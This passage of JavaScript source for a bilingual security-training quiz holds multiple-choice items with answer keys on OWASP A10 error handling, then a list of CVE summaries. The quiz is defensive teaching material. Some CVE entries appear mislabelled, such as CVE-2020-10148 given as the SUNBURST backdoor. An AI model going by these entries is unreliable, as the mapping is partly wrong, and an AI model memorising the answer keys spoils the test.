          M('null, пустая строка, отрицательное число, экстремально длинная строка, значение с переполнением типа данных', 'null, an empty string, a negative number, an extremely long string, a value that overflows the data type'),
          M('Только строки на английском языке', 'Only strings in English'),
        ],
        ans: 2,
        e: M('Edge-case\'ы для тестов ошибок: null, пустая строка, отрицательные числа, сверхдлинные строки, переполнение типов.', 'Error-handling edge cases to test include null, empty string, negatives, extreme lengths, and type overflows.'),
      },
      {
        q: M('Почему load/stress-тестирование релевантно для категории A10, а не только для тестирования производительности?', 'Why is load/stress testing relevant to category A10, not just to performance testing?'),
        opts: [
          M('Load-тестирование заменяет security-тестирование полностью', 'Load testing fully replaces security testing'),
          M('Не имеет отношения к обработке ошибок', 'It\'s unrelated to error handling'),
          M('Не относится к безопасности вообще', 'It\'s unrelated to security at all'),
          M('Позволяет обнаружить resource exhaustion уязвимости, возникающие из-за накопления необработанных исключений под нагрузкой, что при staging-тестировании с низкой нагрузкой может остаться незамеченным', 'It can reveal resource-exhaustion vulnerabilities arising from an accumulation of unhandled exceptions under load, which may go unnoticed during low-load staging tests'),
        ],
        ans: 3,
        e: M('Load/stress выявляет resource exhaustion из-за накопления необработанных исключений под нагрузкой — сценарий A10, не только perf.', 'Load/stress testing reveals resource exhaustion from accumulating unhandled exceptions under load — an A10 scenario, not only performance.'),
      },
      {
        q: M('Что из перечисленного демонстрирует «state corruption» через некорректную обработку нештатного условия в многошаговой операции?', 'Which of the following demonstrates "state corruption" via improper handling of an exceptional condition in a multi-step operation?'),
        opts: [
          M('Сбой на промежуточном шаге (например, обрыв сети) оставляет систему в несогласованном состоянии, если не предусмотрен полный откат/компенсирующая транзакция', 'A failure at an intermediate step (e.g., a network interruption) leaves the system in an inconsistent state unless a full rollback/compensating transaction is provided'),
          M('Использование HTTPS для всех шагов', 'Using HTTPS for every step'),
          M('Успешное завершение всех шагов без сбоев', 'All steps complete successfully with no failures'),
          M('Логирование каждого шага', 'Logging every step'),
        ],
        ans: 0,
        e: M('Сбой на промежуточном шаге без полного отката оставляет inconsistent state — state corruption через mishandling exceptional conditions.', 'Mid-flow failure without full rollback leaves inconsistent state — state corruption via mishandling exceptional conditions.'),
      },
      {
        q: M('Согласно OWASP, threat modeling и код-ревью конкретно на предмет обработки ошибок рекомендуется, потому что:', 'Why does OWASP recommend threat modeling and code review specifically focused on error handling?'),
        opts: [
          M('Threat modeling относится только к A06 без пересечения с A10', 'Threat modeling relates only to A06, with no overlap with A10'),
          M('Позволяет заранее выявить edge-case\'ы и неправильные предположения о поведении системы при сбоях, прежде чем они станут уязвимостью в продакшене', 'It lets you identify edge cases and incorrect assumptions about failure behavior before they become a production vulnerability'),
          M('обработка ошибок не поддаётся анализу заранее', 'Error handling can\'t be analyzed in advance'),
          M('Код-ревью не выявляет проблемы обработки ошибок', 'Code review doesn\'t reveal error-handling problems'),
        ],
        ans: 1,
        e: M('Threat modeling и code review error handling находят неверные допущения о сбоях и edge-case\'ы до продакшена.', 'Threat modeling and error-handling code review find bad failure assumptions and edge cases before production.'),
      },
      {
        q: M('Что из перечисленного — пример строгой input-валидации с санитизацией как превентивной меры A10?', 'Which of the following is an example of strict input validation with sanitization as a preventive A10 measure?'),
        opts: [
          M('Отсутствие проверки диапазона числовых значений', 'No range check on numeric values'),
          M('Валидация только на клиентской стороне', 'Client-side validation only'),
          M('Проверка типа, диапазона, формата данных ДО их использования в бизнес-логике, отклонение некорректных значений на входе, а не обработка их последствий постфактум', 'Checking the type, range, and format of data BEFORE it\'s used in business logic, rejecting invalid values at the input rather than handling their consequences afterward'),
          M('Полное доверие любому входящему значению без проверки', 'Fully trusting any incoming value without checks'),
        ],
        ans: 2,
        e: M('Строгая проверка типа/диапазона/формата на входе с отклонением некорректных значений предотвращает многие нештатные условия A10.', 'Strict type/range/format checks at the boundary, rejecting invalid values, prevent many A10 exceptional conditions.'),
      },
      {
        q: M('Почему «necessary but insufficient» логирование ошибки без последующего алертинга частично пересекается с проблемой A09, но также относится к A10?', 'Why does "necessary but insufficient" error logging without subsequent alerting partly overlap with the A09 problem, but also relate to A10?'),
        opts: [
          M('Логирование относится только к A09', 'Logging relates only to A09'),
          M('Категории полностью независимы без пересечения', 'The categories are entirely independent, with no overlap'),
          M('A10 не включает логирование вообще', 'A10 doesn\'t include logging at all'),
          M('A10 фокусируется на корректной реакции системы В МОМЕНТ возникновения нештатной ситуации (включая обнаружение через логирование), тогда как A09 — про последующий процесс мониторинга/алертинга по накопленным логам; они дополняют друг друга', 'A10 focuses on the system\'s correct response AT THE MOMENT an exceptional condition occurs (including detection via logging), while A09 covers the subsequent monitoring/alerting process on accumulated logs — they complement each other'),
        ],
        ans: 3,
        e: M('Лог ошибки без алерта пересекается с A09, но A10 фокусируется на корректной реакции системы в момент нештатной ситуации, включая detection.', 'Error logging without alerting overlaps A09, yet A10 centers on the system\'s correct reaction at the moment the exceptional condition occurs, including detection.'),
      },
      {
        q: M('Что из перечисленного — пример правильной реакции API на некорректный/неожиданный формат тела запроса (например, XML вместо ожидаемого JSON)?', 'Which of the following is a correct response by an API to a malformed/unexpected request-body format (e.g., XML instead of the expected JSON)?'),
        opts: [
          M('Явно отклонить запрос с понятным кодом ошибки (400 Bad Request) без утечки внутренних деталей парсера, залогировав попытку', 'Explicitly reject the request with a clear error code (400 Bad Request) without leaking internal parser details, and log the attempt'),
          M('Крашнуть весь процесс сервера', 'Crash the entire server process'),
          M('Проигнорировать проблему и вернуть 200 OK', 'Ignore the problem and return 200 OK'),
          M('Попытаться распарсить любым доступным способом без ограничений', 'Attempt to parse it by any means available, with no restrictions'),
        ],
        ans: 0,
        e: M('На неожиданный формат тела (XML вместо JSON) API должен вернуть 400 без утечки деталей парсера и залогировать попытку.', 'On unexpected body format (XML instead of JSON), the API should return 400 without parser internals and log the attempt.'),
      },
      {
        q: M('Почему «необработанные исключения при интеграции со сторонним API» (например, timeout платёжного шлюза) — специфичный сценарий A10?', 'Why is "unhandled exceptions during third-party API integration" (e.g., a payment gateway timeout) an A10-specific scenario?'),
        opts: [
          M('Сторонние API всегда обрабатывают свои ошибки сами за приложение', 'Third-party APIs always handle their own errors on the app\'s behalf'),
          M('Приложение должно явно предусмотреть и корректно обработать сценарии недоступности/таймаута/некорректного ответа внешней системы, не оставляя пользователя/данные в неопределённом состоянии', 'The application must explicitly anticipate and correctly handle scenarios where an external system is unavailable/times out/responds unexpectedly, without leaving the user/data in an undefined state'),
          M('Сторонние интеграции никогда не дают сбоев', 'Third-party integrations never fail'),
          M('Не относится к обработке исключений', 'It\'s unrelated to exception handling'),
        ],
        ans: 1,
        e: M('Таймауты/сбои внешнего API (платёжный шлюз) — типичный A10: нужно явно обработать, не оставляя деньги/пользователя в undefined state.', 'External API timeouts/failures (payment gateway) are classic A10: handle them explicitly without leaving funds/user in an undefined state.'),
      },
      {
        q: M('CWE-234/235 (missing/extra parameters not handled correctly) в контексте A10 описывает риск, когда:', 'CWE-234/235 (missing/extra parameters not handled correctly) in the A10 context describes a risk where:'),
        opts: [
          M('относится только к cookie', 'it only relates to cookies'),
          M('параметры всегда обрабатываются корректно по умолчанию', 'parameters are always handled correctly by default'),
          M('отсутствие ожидаемого параметра или наличие лишнего необрабатывается явно, что может привести к непредсказуемому поведению или обходу логики', 'a missing expected parameter or an unexpected extra one isn\'t explicitly handled, potentially causing unpredictable behavior or a logic bypass'),
          M('относится только к SQL-запросам', 'it only relates to SQL queries'),
        ],
        ans: 2,
        e: M('CWE-234/235: отсутствие ожидаемого или лишний параметр без явной обработки даёт непредсказуемое поведение или обход логики.', 'CWE-234/235: missing or extra parameters without explicit handling cause unpredictable behavior or logic bypass.'),
      },
      {
        q: M('Что из перечисленного — пример «graceful degradation» как правильного архитектурного паттерна обработки сбоя некритичного компонента?', 'Which of the following is an example of "graceful degradation" as a correct architectural pattern for handling a non-critical component\'s failure?'),
        opts: [
          M('Относится только к сбоям базы данных', 'It only applies to database failures'),
          M('Не существует такого паттерна', 'No such pattern exists'),
          M('При сбое рекомендательной системы весь сайт становится недоступен (полный отказ)', 'When the recommendation engine fails, the entire site becomes unavailable (total outage)'),
          M('При сбое некритичного компонента (например, рекомендаций) основная функциональность (просмотр товара, оплата) продолжает работать без него, с явной, безопасной деградацией функциональности', 'When a non-critical component (e.g., recommendations) fails, core functionality (viewing a product, checkout) keeps working without it, with explicit, safe feature degradation'),
        ],
        ans: 3,
        e: M('Graceful degradation: при падении некритичного компонента (рекомендации) core (каталог, оплата) работает, фича безопасно отключается.', 'Graceful degradation: if a non-critical component (recommendations) fails, core flows (catalog, checkout) continue with that feature safely off.'),
      },
      {
        q: M('Почему «fail open» особенно опасен именно для security-критичных проверок (аутентификация, авторизация), а не для некритичных фич?', 'Why is "fail open" especially dangerous specifically for security-critical checks (authentication, authorization), but not for non-critical features?'),
        opts: [
          M('Для security-проверок fail open напрямую означает предоставление несанкционированного доступа при сбое, тогда как для некритичной фичи (например, рекомендаций) деградация функциональности не создаёт риска безопасности', 'For security checks, fail open directly means granting unauthorized access upon failure, whereas for a non-critical feature (e.g., recommendations), degraded functionality creates no security risk'),
          M('Fail open никогда не относится к security-проверкам', 'Fail open never applies to security checks'),
          M('Fail open одинаково опасен везде без разницы', 'Fail open is equally dangerous everywhere, with no difference'),
          M('Не имеет значения, какой компонент дал сбой', 'It doesn\'t matter which component failed'),
        ],
        ans: 0,
        e: M('Fail open на authn/authz = несанкционированный доступ при сбое; для некритичных фич деградация — допустима, для security-проверок — нет.', 'Fail open on authn/authz grants unauthorized access on failure; degrading a non-critical feature is fine, failing open security checks is not.'),
      },
      {
        q: M('Что из перечисленного — пример корректной обработки переполнения буфера/памяти в языках без автоматического управления памятью (C/C++)?', 'Which of the following is an example of correctly handling buffer/memory overflow in languages without automatic memory management (C/C++)?'),
        opts: [
          M('Игнорирование границ массива для скорости', 'Ignoring array bounds for speed'),
          M('Явная проверка границ перед доступом к памяти, использование безопасных функций работы со строками/буферами вместо небезопасных (strcpy → strncpy и аналоги)', 'Explicit bounds checking before accessing memory, using safe string/buffer functions instead of unsafe ones (strcpy → strncpy and similar)'),
          M('Использование указателей без проверки на null', 'Using pointers with no null checks'),
          M('Отключение всех проверок для производительности', 'Disabling all checks for performance'),
        ],
        ans: 1,
        e: M('В C/C++ нужны bounds checks и безопасные API строк/буферов (strncpy и аналоги) вместо strcpy — корректная обработка границ памяти.', 'In C/C++, use bounds checks and safe string/buffer APIs (strncpy and peers) instead of strcpy — correct handling of memory bounds.'),
      },
      {
        q: M('Почему инцидент типа «атакующий намеренно форсирует ошибку 500, чтобы получить полный стектрейс с версией фреймворка» относится одновременно к A10 и A02?', 'Why does an incident where "an attacker deliberately forces a 500 error to get a full stack trace with the framework version" relate to both A10 and A02 simultaneously?'),
        opts: [
          M('Это относится только к A02', 'It relates only to A02'),
          M('A02 не связан с обработкой ошибок', 'A02 is unrelated to error handling'),
          M('A10 — про сам факт того, что ошибка не была обработана «изнутри» приложения корректно (без утечки деталей); A02 — про то, что конфигурация сервера в принципе позволяет отображать debug-информацию в проде', 'A10 concerns the fact that the error wasn\'t handled "internally" by the app correctly (without leaking details); A02 concerns the fact that the server configuration allows debug information to be displayed in prod at all'),
          M('A10 не связан с раскрытием информации', 'A10 is unrelated to information disclosure'),
        ],
        ans: 2,
        e: M('Форсированный 500 со стектрейсом: A10 — ошибка не обработана без утечки; A02 — конфиг допускает debug-информацию в prod.', 'Forced 500 with a stack trace: A10 is unsafe error handling (leak); A02 is config allowing debug detail in production.'),
      },
      {
        q: M('Что из перечисленного — правильная реакция при обнаружении на пентесте, что многошаговая финансовая транзакция допускает race condition (двойное списание при параллельных запросах)?', 'Which of the following is the correct response to discovering during a pentest that a multi-step financial transaction allows a race condition (double debit under parallel requests)?'),
        opts: [
          M('Сообщить только если атака стабильно воспроизводится в 100% случаев', 'Report it only if the attack reproduces reliably 100% of the time'),
          M('Игнорировать, если PoC сработал только один раз из десяти', 'Ignore it if the PoC only succeeded once out of ten tries'),
          M('Считать это низкоприоритетным «просто багом», не относящимся к security', 'Treat it as a low-priority "just a bug," unrelated to security'),
          M('Классифицировать как значимую уязвимость (пересечение A06 Insecure Design и A10 Mishandling of Exceptional Conditions), рекомендовать атомарность операции через блокировки/транзакции на уровне БД', 'Classify it as a significant vulnerability (overlap of A06 Insecure Design and A10 Mishandling of Exceptional Conditions), recommending atomicity via DB-level locking/transactions'),
        ],
        ans: 3,
        e: M('Race с double debit — значимая уязвимость на стыке A06 (Insecure Design) и A10; лечится атомарностью, блокировками/транзакциями БД.', 'A double-debit race is a significant issue at the A06 (Insecure Design) and A10 boundary; fix with atomicity and DB locks/transactions.'),
      },
      {
        q: M('Почему «test for unexpected input combinations» (например, одновременная отправка конфликтующих параметров) важно тестировать при аудите обработки ошибок?', 'Why is it important to test "unexpected input combinations" (e.g., sending conflicting parameters simultaneously) when auditing error handling?'),
        opts: [
          M('Неожиданные комбинации входных данных — частый источник необработанных edge-case\'ов, которые разработчики не предусмотрели при обычном тестировании happy path', 'Unexpected combinations of input data are a frequent source of unhandled edge cases that developers didn\'t anticipate during normal happy-path testing'),
          M('Достаточно тестировать только по одному параметру за раз', 'It\'s sufficient to test one parameter at a time'),
          M('Такие комбинации никогда не встречаются в реальном трафике', 'Such combinations never occur in real traffic'),
          M('Не относится к A10', 'It\'s unrelated to A10'),
        ],
        ans: 0,
        e: M('Конфликтующие/неожиданные комбинации параметров часто вскрывают edge-case\'ы, не покрытые happy-path тестами.', 'Conflicting or unexpected parameter combinations often expose edge cases missed by happy-path testing.'),
      },
      {
        q: M('Что из перечисленного описывает связь между A10 и A03 (Supply Chain), если сторонняя библиотека сама неправильно обрабатывает исключения?', 'Which of the following describes the link between A10 and A03 (Supply Chain) when a third-party library itself mishandles exceptions?'),
        opts: [
          M('A10 относится только к собственному коду организации', 'A10 applies only to an organization\'s own code'),
          M('Уязвимая к mishandling of exceptional conditions сторонняя зависимость (например, библиотека, падающая небезопасно при определённом вводе) — это одновременно и риск supply chain (использование уязвимого компонента), и конкретное проявление A10 на уровне того компонента', 'A third-party dependency vulnerable to mishandling of exceptional conditions (e.g., a library that crashes unsafely on certain input) is simultaneously a supply-chain risk (use of a vulnerable component) and a concrete A10 manifestation at the level of that component'),
          M('Категории никак не связаны', 'The categories are entirely unrelated'),
          M('A03 не пересекается ни с одной другой категорией', 'A03 doesn\'t overlap with any other category'),
        ],
        ans: 1,
        e: M('Библиотека с небезопасной обработкой исключений — и A03 (supply chain/vulnerable component), и конкретное A10 на уровне зависимости.', 'A library that mishandles exceptions is both A03 (supply-chain/vulnerable component) and concrete A10 at the dependency level.'),
      },
      {
        q: M('Согласно OWASP, ранее часть этих CWE относили к слишком общей формулировке. Какой была эта прежняя, менее конкретная формулировка?', 'Per OWASP, which vaguer, more general label were part of these CWEs previously filed under?'),
        opts: [
          M('«Weak Authentication»', '"Weak Authentication"'),
          M('«Unsafe Deserialization»', '"Unsafe Deserialization"'),
          M('«Poor code quality»', '"Poor code quality"'),
          M('«Broken Cryptography»', '"Broken Cryptography"'),
        ],
        ans: 2,
        e: M('OWASP ранее относил часть этих CWE к размытой формулировке «poor code quality»; A10 сузил фокус до поведения при нештатных условиях.', 'OWASP previously filed some of these CWEs under vague "poor code quality"; A10 narrows focus to behavior under exceptional conditions.'),
      },
      {
        q: M('Что из перечисленного — пример недостаточной обработки ситуации «неожиданный null» в объектно-ориентированном языке с nullable-типами?', 'Which of the following is an example of insufficient handling of an "unexpected null" in an object-oriented language with nullable types?'),
        opts: [
          M('Явная обработка Optional.empty()', 'Explicitly handling Optional.empty()'),
          M('Явная проверка на null перед разыменованием объекта (Optional/null-check)', 'An explicit null check before dereferencing an object (Optional/null-check)'),
          M('Использование строгой типизации без nullable', 'Using strict typing with no nullable types'),
          M('Прямое обращение к методу объекта без проверки на null, что приводит к NullPointerException и потенциальному краху/DoS', 'Directly calling a method on an object without a null check, resulting in a NullPointerException and potential crash/DoS'),
        ],
        ans: 3,
        e: M('Вызов метода без null-check → NullPointerException, крэш/DoS — недостаточная обработка unexpected null (CWE-476-класс).', 'Calling a method without a null check → NullPointerException, crash/DoS — insufficient handling of unexpected null (CWE-476 class).'),
      },
      {
        q: M('Почему «необработанное исключение при парсинге JSON от клиента» может представлять не только доступность (DoS), но и потенциальный риск безопасности?', 'Why can "an unhandled exception while parsing client-supplied JSON" pose a security risk in addition to an availability (DoS) concern?'),
        opts: [
          M('В зависимости от реализации, сбой при парсинге может оставить систему в непредсказуемом промежуточном состоянии, потенциально пропустив последующие проверки безопасности, которые ожидали выполнения после успешного парсинга', 'Depending on the implementation, a parsing failure can leave the system in an unpredictable intermediate state, potentially skipping subsequent security checks that expected the parse to succeed first'),
          M('Парсинг JSON всегда безопасен', 'JSON parsing is always safe'),
          M('Не относится к A10', 'It\'s unrelated to A10'),
          M('JSON никогда не вызывает исключений', 'JSON parsing never raises exceptions'),
        ],
        ans: 0,
        e: M('Необработанный сбой парсинга JSON может оставить промежуточное состояние и пропустить security-checks, ожидавшие успешный parse — риск шире DoS.', 'Unhandled JSON parse failure can leave intermediate state and skip security checks that assumed a successful parse — risk beyond mere DoS.'),
      },
      {
        q: M('Что из перечисленного — правильный архитектурный подход к обработке сбоя внешнего сервиса авторизации (auth service) в микросервисной архитектуре?', 'Which of the following is the correct architectural approach to handling a failure of an external authorization service in a microservices architecture?'),
        opts: [
          M('Бесконечные повторные попытки без таймаута, блокирующие весь поток обработки', 'Infinite retries with no timeout, blocking the entire processing pipeline'),
          M('Circuit breaker паттерн с fail-closed поведением по умолчанию — при недоступности auth-сервиса запросы, требующие авторизации, отклоняются, а не пропускаются', 'A circuit-breaker pattern with fail-closed default behavior — requests requiring authorization are denied, not waved through, when the auth service is unavailable'),
          M('Автоматическое разрешение всех запросов при недоступности auth-сервиса', 'Automatically approve all requests when the auth service is unavailable'),
          M('Полное отключение логирования при сбое auth-сервиса', 'Fully disabling logging when the auth service fails'),
        ],
        ans: 1,
        e: M('При недоступности auth-сервиса circuit breaker с fail-closed отклоняет запросы, требующие авторизации, а не пропускает их.', 'When the auth service is down, a circuit breaker with fail-closed denies authorization-required requests rather than waving them through.'),
      },
      {
        q: M('Почему «необработанные исключения в фоновых задачах» (background jobs/cron) представляют специфичный риск для A10, отличный от синхронных HTTP-запросов?', 'Why do "unhandled exceptions in background jobs" (cron/background tasks) pose a risk distinct from synchronous HTTP requests in the A10 context?'),
        opts: [
          M('Фоновые задачи не относятся к приложению', 'Background jobs are unrelated to the application'),
          M('Фоновые задачи никогда не дают сбоев', 'Background jobs never fail'),
          M('Сбой фоновой задачи (например, обработка платежей batch-джобом) может остаться незамеченным дольше, так как нет немедленного пользовательского отклика об ошибке, что требует отдельного мониторинга/алертинга', 'A failed background job (e.g., a batch payment-processing job) can go unnoticed longer, since there\'s no immediate user-facing error response, requiring separate monitoring/alerting'),
          M('Не отличается от обработки HTTP-запросов', 'It\'s no different from handling HTTP requests'),
        ],
        ans: 2,
        e: M('Сбой background job/cron не даёт мгновенного user-facing error, поэтому дольше остаётся незамеченным — нужны отдельные мониторинг и алертинг.', 'Background job/cron failures lack an immediate user-facing error, so they stay unnoticed longer — they need separate monitoring and alerting.'),
      },
      {
        q: M('Что из перечисленного — пример корректной обработки timeout при вызове внешнего API оплаты, чтобы избежать двойного списания при повторной попытке?', 'Which of the following is an example of correctly handling a timeout when calling an external payment API, to avoid double-charging on retry?'),
        opts: [
          M('Немедленно откатить весь заказ без проверки статуса у платёжного провайдера', 'Immediately rolling back the whole order without checking the status with the payment provider'),
          M('Игнорировать таймаут и считать оплату успешной', 'Ignoring the timeout and assuming the payment succeeded'),
          M('Просто повторить запрос оплаты автоматически при таймауте без дополнительных проверок', 'Simply retrying the payment request automatically on timeout with no additional checks'),
          M('Использовать идемпотентный ключ (idempotency key) для запроса, чтобы повторная отправка того же запроса не привела к повторному списанию средств', 'Using an idempotency key for the request, so resubmitting the same request doesn\'t result in a duplicate charge'),
        ],
        ans: 3,
        e: M('Idempotency key при вызове payment API предотвращает двойное списание при retry после timeout — корректная реакция на exceptional condition.', 'An idempotency key on payment API calls prevents double charge on timeout retry — correct reaction to that exceptional condition.'),
      },
      {
        q: M('Почему «явное определение поведения при недостижимых/невозможных по логике состояниях» (например, switch без default-кейса для enum) важно при разработке?', 'Why does "explicitly defining behavior for unreachable/logically impossible states" (e.g., a switch with no default case for an enum) matter during development?'),
        opts: [
          M('Изменения в коде/данных со временем могут привести к ранее «невозможному» состоянию; explicit-обработка (в т.ч. default-кейс с логированием) предотвращает тихий пропуск такой ситуации', 'Changes to code/data over time can lead to a previously "impossible" state occurring; explicit handling (including a default case with logging) prevents it from being silently skipped'),
          M('Достаточно комментария в коде без обработки', 'A code comment is sufficient, without actual handling'),
          M('Не имеет значения для безопасности', 'It has no bearing on security'),
          M('Такие состояния никогда не возникают на практике', 'Such states never arise in practice'),
        ],
        ans: 0,
        e: M('«Невозможные» состояния со временем становятся возможными; default-ветка с логом/алертом предотвращает тихий пропуск такого случая.', '"Impossible" states become possible as code/data change; a default branch with log/alert prevents silently skipping that case.'),
      },
      {
        q: M('Что из перечисленного — правильный подход к обработке исключения при недостаточных правах доступа к файлу на диске (OS-level ошибка) в приложении?', 'Which of the following is the correct approach to handling an exception caused by insufficient file-system permissions (an OS-level error) in an application?'),
        opts: [
          M('Крашнуть весь процесс приложения без логирования', 'Crash the entire application process with no logging'),
          M('Отклонить операцию, вернуть понятную ошибку пользователю без утечки пути к файлу, залогировать инцидент с полным контекстом на сервере', 'Deny the operation, return a clear error to the user without leaking the file path, and log the incident with full server-side context'),
          M('Разрешить операцию в обход проверки при ошибке доступа (fail open)', 'Allow the operation to proceed, bypassing the check (fail open)'),
          M('Молча проигнорировать ошибку и продолжить выполнение как ни в чём не бывало', 'Silently ignore the error and continue as if nothing happened'),
        ],
        ans: 1,
        e: M('При ошибке прав на файл: отказать, отдать пользователю безопасное сообщение без пути, залогировать полный server-side контекст.', 'On file-permission errors: deny, return a safe user message without the path, and log full server-side context.'),
      },
      {
        q: M('Почему категория A10 логически «замыкает» список OWASP Top 10:2025, охватывая нештатные условия, которые могут возникнуть в результате эксплуатации ЛЮБОЙ из предыдущих девяти категорий?', 'Why does category A10 logically "close out" the OWASP Top 10:2025 list, covering exceptional conditions that can arise from exploiting ANY of the other nine categories?'),
        opts: [
          M('A10 не тестируется на практике никогда', 'A10 is never actually tested in practice'),
          M('A10 относится только к DoS-атакам', 'A10 relates only to DoS attacks'),
          M('Некорректная обработка ошибок часто становится финальным звеном в эксплуатации других уязвимостей (например, инъекция вызывает ошибку БД → некорректная обработка этой ошибки раскрывает данные) — A10 про то, что происходит на границе отказа системы независимо от первопричины', 'Improper error handling often becomes the final link in exploiting other vulnerabilities (e.g., an injection triggers a DB error → mishandling that error leaks data) — A10 concerns what happens at the system\'s failure boundary regardless of the root cause'),
          M('A10 не связана с остальными категориями', 'A10 is unrelated to the other categories'),
        ],
        ans: 2,
        e: M('A10 замыкает Top 10: некорректная обработка ошибок часто — финальное звено эксплуатации любой из предыдущих категорий (инъекция → ошибка БД → утечка).', 'A10 closes the Top 10: bad error handling is often the last link when exploiting any prior category (injection → DB error → leak).'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ комплексно снижает риск категории A10 (Mishandling of Exceptional Conditions) для организации?', 'Which measure MOST comprehensively reduces an organization\'s risk from category A10 (Mishandling of Exceptional Conditions)?'),
        opts: [
          M('Только увеличение таймаутов на всех запросах', 'Only increasing timeouts on all requests'),
          M('Полное отключение try-catch блоков для простоты кода', 'Fully removing try-catch blocks for code simplicity'),
          M('Логирование ошибок без какой-либо их фактической обработки', 'Logging errors without ever actually handling them'),
          M('Централизованная стратегия обработки ошибок (fail closed по умолчанию, обработка в месте возникновения, отсутствие утечки внутренних деталей) + строгая input-валидация + rate limiting/resource quotas превентивно + stress/pen-тестирование edge-case\'ов', 'A centralized error-handling strategy (fail closed by default, handling at the point of occurrence, no leakage of internal details) + strict input validation + preventive rate limiting/resource quotas + stress/pentest of edge cases'),
        ],
        ans: 3,
        e: M('Максимальное снижение A10: единая стратегия (fail closed, обработка на месте, без утечек) + валидация + rate limits/quotas + stress/pen-тесты edge-case\'ов.', 'Best A10 reduction: centralized strategy (fail closed, handle at origin, no leaks) plus validation, rate limits/quotas, and stress/pen testing of edge cases.'),
      },
    ],
  },
];

/* ── CVE corpus ───────────────────────────────────── */

const CVES = [
  {id:'CVE-2021-44228',y:2021,d:'Apache Log4j2 JNDI lookup RCE. Payload in any logged field loads a Java class from external LDAP.',v:10.0,s:'CRITICAL',c:'CWE-917',o:'A06',ve:'Apache',p:'Apache'},
  {id:'CVE-2014-0160',y:2014,d:'OpenSSL Heartbleed: leak up to 64KB memory via malformed TLS Heartbeat.',v:7.5,s:'HIGH',c:'CWE-125',o:'A02',ve:'OpenSSL',p:'OpenSSL'},
  {id:'CVE-2014-6271',y:2014,d:'GNU Bash ShellShock: command execution via env vars (CGI).',v:9.8,s:'CRITICAL',c:'CWE-78',o:'A03',ve:'GNU',p:'GNU'},
  {id:'CVE-2020-1472',y:2020,d:'ZeroLogon: Netlogon AES-CFB8 IV=0 → reset Domain Controller password without auth.',v:10.0,s:'CRITICAL',c:'CWE-330',o:'A07',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2021-26855',y:2021,d:'ProxyLogon: Exchange SSRF bypassed auth. APT HAFNIUM, >250k servers.',v:9.1,s:'CRITICAL',c:'CWE-918',o:'A10',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2024-3094',y:2024,d:'XZ Utils backdoor in liblzma: supply chain in official tarball.',v:10.0,s:'CRITICAL',c:'CWE-506',o:'A08',ve:'Tukaani',p:'Tukaani'},
  {id:'CVE-2024-6387',y:2024,d:'regreSSHion: OpenSSH sshd race condition, unauth RCE on glibc Linux.',v:8.1,s:'HIGH',c:'CWE-362',o:'A06',ve:'OpenBSD',p:'OpenBSD'},
  {id:'CVE-2017-5638',y:2017,d:'Apache Struts 2 RCE via Content-Type. Equifax — 143M records.',v:10.0,s:'CRITICAL',c:'CWE-20',o:'A05',ve:'Apache',p:'Apache'},
  {id:'CVE-2020-10148',y:2020,d:'SolarWinds Orion SUNBURST backdoor in official update.',v:9.8,s:'CRITICAL',c:'CWE-506',o:'A08',ve:'SolarWinds',p:'SolarWinds'},
  {id:'CVE-2022-22965',y:2022,d:'Spring4Shell: Spring DataBinder class pollution RCE on JDK 9+.',v:9.8,s:'CRITICAL',c:'CWE-94',o:'A06',ve:'VMware',p:'VMware'},
  {id:'CVE-2021-41773',y:2021,d:'Apache HTTP 2.4.49 path traversal: read files outside webroot.',v:7.5,s:'HIGH',c:'CWE-22',o:'A01',ve:'Apache',p:'Apache'},
  {id:'CVE-2023-23397',y:2023,d:'Outlook NTLM hash leak via UNC path in reminders. 0-click.',v:9.8,s:'CRITICAL',c:'CWE-294',o:'A01',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2022-40684',y:2022,d:'FortiGate auth bypass via alternate path in admin API.',v:9.8,s:'CRITICAL',c:'CWE-288',o:'A07',ve:'Fortinet',p:'Fortinet'},
  {id:'CVE-2023-34048',y:2023,d:'VMware vCenter DCERPC heap overflow: unauth RCE.',v:9.8,s:'CRITICAL',c:'CWE-787',o:'A07',ve:'VMware',p:'VMware'},
  {id:'CVE-2015-4000',y:2015,d:'LOGJAM: TLS downgrade to DHE_EXPORT 512-bit DH.',v:3.7,s:'LOW',c:'CWE-310',o:'A02',ve:'Various',p:'Various'},
  {id:'CVE-2022-0778',y:2022,d:'OpenSSL infinite loop BN_mod_sqrt: DoS via cert.',v:7.5,s:'HIGH',c:'CWE-835',o:'A02',ve:'OpenSSL',p:'OpenSSL'},
  {id:'CVE-2021-34527',y:2021,d:'PrintNightmare: Print Spooler RCE/LPE via malicious driver.',v:8.8,s:'HIGH',c:'CWE-269',o:'A01',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2019-0230',y:2019,d:'Struts OGNL/SSRF via Freemarker template injection.',v:9.8,s:'CRITICAL',c:'CWE-918',o:'A10',ve:'Apache',p:'Apache'},
  {id:'CVE-2022-30190',y:2022,d:'Follina: MSDT RCE via Office without macros.',v:7.8,s:'HIGH',c:'CWE-610',o:'A04',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2023-44487',y:2023,d:'HTTP/2 Rapid Reset DoS. Record 398M rps at Google.',v:7.5,s:'HIGH',c:'CWE-400',o:'A03',ve:'Various',p:'Various'},
  {id:'CVE-2021-3156',y:2021,d:'Sudo Baron Samedit: heap overflow → LPE root.',v:7.8,s:'HIGH',c:'CWE-122',o:'A01',ve:'Todd Miller',p:'Todd Miller'},
  {id:'CVE-2021-22986',y:2021,d:'F5 BIG-IP iControl REST unauth RCE.',v:9.8,s:'CRITICAL',c:'CWE-306',o:'A01',ve:'F5',p:'F5'},
  {id:'CVE-2019-19781',y:2019,d:'Citrix ADC path traversal + RCE unauth.',v:9.8,s:'CRITICAL',c:'CWE-22',o:'A05',ve:'Citrix',p:'Citrix'},
  {id:'CVE-2018-13379',y:2018,d:'FortiGate SSL-VPN path traversal: session files leak.',v:9.8,s:'CRITICAL',c:'CWE-22',o:'A05',ve:'Fortinet',p:'Fortinet'},
  {id:'CVE-2020-0796',y:2020,d:'SMBGhost: SMBv3 compression wormable RCE.',v:10.0,s:'CRITICAL',c:'CWE-119',o:'A06',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2019-11510',y:2019,d:'Pulse Secure VPN arbitrary file read unauth.',v:10.0,s:'CRITICAL',c:'CWE-22',o:'A05',ve:'Pulse Secure',p:'Pulse Secure'},
